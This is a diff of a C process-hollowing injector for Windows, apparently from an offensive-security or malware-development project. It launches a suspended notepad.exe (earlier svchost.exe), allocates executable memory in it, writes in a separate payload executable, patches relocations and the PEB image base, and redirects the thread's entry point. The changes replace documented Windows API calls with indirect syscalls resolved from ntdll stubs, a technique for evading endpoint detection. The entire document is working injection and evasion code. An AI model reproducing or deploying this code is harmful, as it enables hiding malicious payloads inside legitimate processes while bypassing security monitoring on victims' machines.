@@ -8,14 +8,23 @@
 
 DWORD wNtAllocateVirtualMemory;
 UINT_PTR sysAddrNtAllocateVirtualMemory;
+
 DWORD wNtWriteVirtualMemory;
 UINT_PTR sysAddrNtWriteVirtualMemory;
 
+DWORD wNtReadVirtualMemory;
+UINT_PTR sysAddrNtReadVirtualMemory;
+
+//DWORD wNtSetContextThread;
+//UINT_PTR sysAddrNtSetContextThread;
+
+DWORD wNtGetContextThread;
+UINT_PTR sysAddrNtGetContextThread;
 
 BOOL CreateSuspendedProcess(LPPROCESS_INFORMATION pi, LPCSTR processName) {
 	STARTUPINFOA si = { 0 };
 
-	if (!CreateProcessA(processName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
+	if (!CreateProcessA(processName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, pi)) {
 		wprintf(L"[-] ERROR : Unable to create suspended process (error code : %lu)", GetLastError());
 		return FALSE;
 	}
@@ -62,7 +71,7 @@ BOOL RetrieveNtHeaders(PIMAGE_NT_HEADERS64* ntHeader, LPVOID peContent) {
 
 BOOL CopyPE(HANDLE hProcess, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent, PIMAGE_NT_HEADERS64 peInjectNtHeader,
 	PIMAGE_SECTION_HEADER* peToInjectRelocSection)
-{	
+{
 
 	// Je donne à mon imagebase la nouvelle adresse de la séction mémoire créée dans main
 	peInjectNtHeader->OptionalHeader.ImageBase = (DWORD64)*allocAddrOnTarget;
@@ -72,19 +81,19 @@ BOOL CopyPE(HANDLE hProcess, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent
 	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
 	wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
 
-	// on décale de +0x12 car c'est ici que se trouve l'instruction syscall de ntdll
+
 	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
 
-	// J'éris le header de mon pe à la nouvelle adresse afin que par la suite je puisse déplacer les sections
-	/*if (!WriteProcessMemory(hProcess, *allocAddrOnTarget, peToInjectContent, peInjectNtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
-		wprintf(L"[-] Cannot write headers in target process (error code : %lu)", GetLastError());
-		return FALSE;
-	}*/
+		printf("[DBG] NtWriteVirtualMemory (headers):\n\t- Target address: 0x%p\n\t- Source address: 0x%p\n\t- Size: 0x%lx\n",
+			*allocAddrOnTarget,
+			peToInjectContent,
+			peInjectNtHeader->OptionalHeader.SizeOfImage);
+
 
 	NTSTATUS status = NtWriteVirtualMemory(hProcess, *allocAddrOnTarget, peToInjectContent,
-		peInjectNtHeader->OptionalHeader.SizeOfImage, NULL);
+		peInjectNtHeader->OptionalHeader.SizeOfHeaders, NULL);
 	if (!NT_SUCCESS(status)) {
-		wprintf(L"[-] Cannot write headers in target process (error code : %lu)", GetLastError());
+		wprintf(L"[-] Cannot write headers in target process (error code : 0x%08X)", status);
 		return FALSE;
 	}
 
@@ -106,14 +115,12 @@ BOOL CopyPE(HANDLE hProcess, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent
 			wprintf(L"\t[*] Reloc table found at 0x%p offset\r\n", (LPVOID)(UINT64)currentSectionHeader->VirtualAddress);
 		}
 
-		if (!WriteProcessMemory(hProcess, (LPVOID)((UINT64)*allocAddrOnTarget + currentSectionHeader->VirtualAddress),
-			(LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, NULL))
-		{
+		NTSTATUS status = NtWriteVirtualMemory(hProcess, (LPVOID)((UINT64)*allocAddrOnTarget + currentSectionHeader->VirtualAddress),
+			(LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, NULL);
+		if (!NT_SUCCESS(status)) {
 			wprintf(L"[-] Cannot write section in the target process (error code : %lu)", GetLastError());
 			return FALSE;
 		}
-		printf("\t[+] Section %s written at 0x%p\r\n", (LPSTR)currentSectionHeader->Name,
-			(LPVOID)((UINT64)*allocAddrOnTarget + currentSectionHeader->VirtualAddress));
 
 		// Si la section est un .text (code)
 		if (!strcmp((char*)currentSectionHeader->Name, ".text"))
@@ -143,6 +150,17 @@ BOOL fixRelocTable(HANDLE hProcess, PIMAGE_SECTION_HEADER peToInjectRelocSection
 	}
 
 	DWORD relocOffset = 0;
+
+	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+	
+	UINT_PTR pNtReadVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtReadVirtualMemory");
+	wNtReadVirtualMemory = ((unsigned char*)(pNtReadVirtualMemory + 4))[0];
+	sysAddrNtReadVirtualMemory = pNtReadVirtualMemory + 0x12;
+	NTSTATUS status = NULL;
+
 	while (relocOffset < relocationTable.Size) {
 		PBASE_RELOCATION_BLOCK currentReloc = (PBASE_RELOCATION_BLOCK)((PBYTE)peToInjectContent +
 			peToInjectRelocSection->PointerToRawData + relocOffset);
@@ -160,33 +178,38 @@ BOOL fixRelocTable(HANDLE hProcess, PIMAGE_SECTION_HEADER peToInjectRelocSection
 			PVOID addressLocation = (PBYTE)*allocAddrOnTarget + currentReloc->PageAddress + currentRelocEntry->Offset;
 			PBYTE patchedAddress = 0;
 
-			if (!ReadProcessMemory(hProcess, (PVOID)addressLocation, &patchedAddress, sizeof(PVOID), NULL)) {
+			status = NtReadVirtualMemory(hProcess, (PVOID)addressLocation, &patchedAddress, sizeof(PVOID), NULL);
+			if (!NT_SUCCESS(status)) {
 				wprintf(L"[-] Cannot read target process memory at %p (error code : %lu)", (PVOID)((UINT64)addressLocation), GetLastError());
 				return FALSE;
 			}
+
 			wprintf(L"\t[+] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)patchedAddress, (VOID*)(patchedAddress + deltaImageBase));
 
 			patchedAddress += deltaImageBase;
 
-			if (!WriteProcessMemory(hProcess, (PVOID)addressLocation, &patchedAddress, sizeof(PVOID), NULL)) {
+			status = NtWriteVirtualMemory(hProcess, (PVOID)addressLocation, &patchedAddress, sizeof(PVOID), NULL);
+			if (!NT_SUCCESS(status)) {
 				wprintf(L"[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x\r\n",
 					(PVOID)((UINT64)addressLocation), GetLastError());
 				return FALSE;
 			}
 		}
 	}
+	if (hNtdll) FreeLibrary(hNtdll);
 	return TRUE;
 }
 
 int main() {
 	PROCESS_INFORMATION pi = { 0 };
-	LPCSTR targetProcess = "C:\\Windows\\System32\\svchost.exe";
-	LPCSTR peName = "C:\\Windows\\System32\\calc.exe";
+	LPCSTR targetProcess = "C:\\Windows\\System32\\notepad.exe";
+	LPCSTR peName = "C:\\Users\\Shrek\\source\\repos\\payload2\\x64\\Release\\payload2.exe";
 	DWORD peSize = 0;
 	LPVOID peToInjectContent = NULL;
 	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
 	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;
 	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+	NTSTATUS status = NULL;
 
 	if (!CreateSuspendedProcess(&pi, targetProcess)) goto __err;
 	Sleep(1000);
@@ -207,8 +230,8 @@ int main() {
 	sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
 
 	SIZE_T regionSize = (SIZE_T)peInjectNtHeaders->OptionalHeader.SizeOfImage;
-	
-	NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &allocAddrOnTarget, 0, &regionSize,
+
+	status = NtAllocateVirtualMemory(pi.hProcess, &allocAddrOnTarget, 0, &regionSize,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	if (!NT_SUCCESS(status)) {
@@ -231,39 +254,57 @@ int main() {
 
 
 	CONTEXT CTX = { 0 };
-	CTX.ContextFlags = CONTEXT_FULL;
+	CTX.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
 
-	BOOL bGetContext = GetThreadContext(pi.hThread, &CTX);
-	if (!bGetContext) {
+	UINT_PTR pNtGetContextThread = (UINT_PTR)GetProcAddress(hNtdll, "NtGetContextThread");
+	wNtGetContextThread = ((unsigned char*)(pNtGetContextThread + 4))[0];
+	sysAddrNtGetContextThread = pNtGetContextThread + 0x12;
+
+	status = NtGetContextThread(pi.hThread, &CTX);
+	if (!NT_SUCCESS(status)) {
 		wprintf(L"[-] An error occured when trying to get the thread context.\n");
 		goto __err;
 	}
+	//BOOL bGetContext = GetThreadContext(pi.hThread, &CTX);
+	//if (!bGetContext) {
+	//	wprintf(L"[-] An error occured when trying to get the thread context.\n");
+	//	goto __err;
+	//}
 
-	BOOL bWritePEB = WriteProcessMemory(pi.hProcess, (PVOID)(CTX.Rdx + 0x10), &peInjectNtHeaders->OptionalHeader.ImageBase,
+	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+
+	status = NtWriteVirtualMemory(pi.hProcess, (PVOID)(CTX.Rdx + 0x10), &peInjectNtHeaders->OptionalHeader.ImageBase,
 		sizeof(PVOID), NULL);
-	if (!bWritePEB) {
+	if (!NT_SUCCESS(status)) {
 		wprintf(L"[-] An error occured when trying to write the image base in the PEB.\n");
 		goto __err;
 	}
-
-	wprintf(L"[*] EntryPoint address in RCX (CTX.Rcx) : 0x%llx\n",
-		(DWORD64)allocAddrOnTarget + peInjectNtHeaders->OptionalHeader.AddressOfEntryPoint);
-
-
 	CTX.Rcx = (DWORD64)allocAddrOnTarget + peInjectNtHeaders->OptionalHeader.AddressOfEntryPoint;
 
+	//UINT_PTR pNtSetContextThread = (UINT_PTR)GetProcAddress(hNtdll, "NtSetContextThread");
+	//wNtSetContextThread = ((unsigned char*)(pNtSetContextThread + 4))[0];
+	//sysAddrNtSetContextThread = pNtSetContextThread + 0x12;
+
+	//status = NtSetContextThread(pi.hThread, &CTX);
+	//if (!NT_SUCCESS(status)) {
+	//	wprintf(L"[-] An error occured when trying to set the thread context : 0x%08X", status);
+	//	goto __err;
+	//}
 
 	BOOL bSetContext = SetThreadContext(pi.hThread, &CTX);
 	if (!bSetContext) {
 		wprintf(L"[-] An error occured when trying to set the thread context.\n");
 	}
 
-	ResumeThread(pi.hThread);
-	FreeLibrary(hNtdll);
+	if (pi.hThread != NULL) ResumeThread(pi.hThread);
+
+	if (hNtdll != NULL) FreeLibrary(hNtdll);
 	return 0;
 
 __err:
-	if (pi.hProcess) TerminateProcess(pi.hProcess, -1);
+	if (pi.hProcess != NULL) TerminateProcess(pi.hProcess, -1);
 	if (hNtdll) FreeLibrary(hNtdll);
 	return -1;
 }
